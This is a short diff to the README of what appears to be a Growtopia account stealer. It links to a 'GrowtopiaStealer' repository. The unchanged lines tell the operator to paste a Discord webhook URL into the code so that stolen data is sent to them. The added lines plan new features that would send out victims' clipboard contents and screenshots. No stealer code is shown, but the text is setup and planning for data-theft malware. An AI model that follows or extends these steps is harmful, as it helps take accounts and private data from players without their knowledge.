@@ -8,4 +8,8 @@ Other Version: https://github.com/TheC0mpany/GrowtopiaStealer
 in the file DiscordWebhook.cs on string private static string defaultWebhook = ""; insert your url webhook <br/>
 Also var client = new DiscordWebhookClient(""); insert too
 
-
+# ToDo list
+<ul>
+<li>ClipBord sender</li>
+<li>Screnshot sender</li>
+</ul>
